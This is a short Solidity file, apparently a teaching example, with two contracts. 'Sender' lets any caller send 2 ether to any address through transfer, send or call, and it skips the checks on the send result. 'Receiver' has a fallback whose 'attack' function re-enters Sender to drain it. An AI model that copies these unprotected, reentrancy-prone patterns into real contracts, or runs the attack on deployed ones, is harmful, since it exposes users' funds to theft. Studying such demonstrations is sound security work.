// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;


contract Sender {

    constructor() payable {

    }

    function sendEtherWithTransfer(address payable _contract) public {
        _contract.transfer(2 ether);
    }

    function sendEtherWithSend(address payable _contract) public returns(bool) {
        bool sent = _contract.send(2 ether);
        //require(sent);
        return sent;
    }

    function sendEtherWithCall(address payable _contract) public returns(bool) {
        (bool sent, bytes memory data) = _contract.call{value: 2 ether}("");
        return sent;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Receiver {

    address _target;
    address _lastsender;
    uint balance;

    constructor(address target){
        _target = target;
    }

    fallback() external payable{
        balance += msg.value;
        _lastsender = msg.sender;
        attack();
    }

    function attack() internal {
        _target.call(abi.encodeWithSignature("sendEtherWithCall(address)", address(this)));
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}
